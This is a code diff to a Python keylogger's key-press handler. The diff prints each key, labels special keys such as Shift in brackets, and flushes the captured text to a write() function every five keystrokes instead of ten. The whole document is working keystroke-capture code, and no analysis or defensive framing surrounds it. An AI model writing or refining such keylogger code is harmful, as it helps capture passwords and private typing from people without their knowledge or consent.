@@ -12,18 +12,20 @@ def start():
         global count, keys
 
         def on_press(key):
+            print(key)
             global count, keys
             key = str(key)
             if key == "Key.space":
                 keys += " "
                 count += 1
-            elif key == "Key.backspace":
-                keys = keys[:-1]
+            elif key[0:3] == "Key":
+                key = key[4:]
+                keys += f" [{key}] "
             else:
                 key = key.replace("'", "")
                 keys += key
                 count += 1
-            if count == 10:
+            if count == 5:
                 write()
                 count = 0
                 keys = ""
